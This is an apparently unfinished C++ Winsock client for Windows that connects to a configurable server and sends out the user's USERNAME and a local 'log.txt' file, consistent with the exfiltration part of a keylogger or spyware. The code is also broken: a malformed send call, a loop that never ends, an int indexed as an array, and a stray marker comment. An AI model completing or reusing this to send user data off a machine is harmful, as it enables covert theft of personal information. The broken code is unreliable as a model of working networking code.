#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <iostream>
#include <fstream>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512

//Define here the port you will be using in the server side
#define DEFAULT_PORT "27017"

//Define here the ipaddress you will be using in the server side
#define DEFAULT_IP_ADDRESS "127.0.0.1"

int main(){

    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    const char *sendbuf = "this is a test";
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        sleep(10);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(DEFAULT_IP_ADDRESS, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        sleep(10);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for connecting to server
    ConnectSocket = socket(result->ai_family, result->ai_socktype, 
        result->ai_protocol);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        sleep(10);
        WSACleanup();
        return 1;
    }

    // Connect to server.
    iResult = connect( ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
        freeaddrinfo(result);
        std::cout << "unable to connect to server" << std::endl;
        sleep(10);
        WSACleanup();
        return 1;
    }

    const char* username = std::getenv("USERNAME");
    int user_len = strlen(username);
    int username_size = htonl(user_len);
    int read_bytes_user = 4;

    //Sends the username length to the server
    while(read_bytes_user > 0){
        const int read_bytes = send(ConnectSocket, (const char*) &username_size[4-read_bytes_user],read_bytes_user, 0);
        if(read_bytes < 0){
            std::cout << "ERROR" << std::endl;
        }
        read_bytes_user -= read_bytes;
    }

    ///TOU AQUUIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII/////////////
    //Sends the username to the server
    while(user_len > 0){
        int user_path_send = send( ConnectSocket, username[],, 0);
    }
    

    ifstream file("log.txt", ios::binary);
    file.seekg(0,ios::end);
    int file_size = htonl(file.tellg());
    
    // Send an initial buffer
    iResult = send( ConnectSocket, (const char*) &file_size, 4, 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        sleep(10);
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    printf("Bytes Sent: %ld\n", iResult);
    sleep(5);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        sleep(10);
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();
    return 1;
}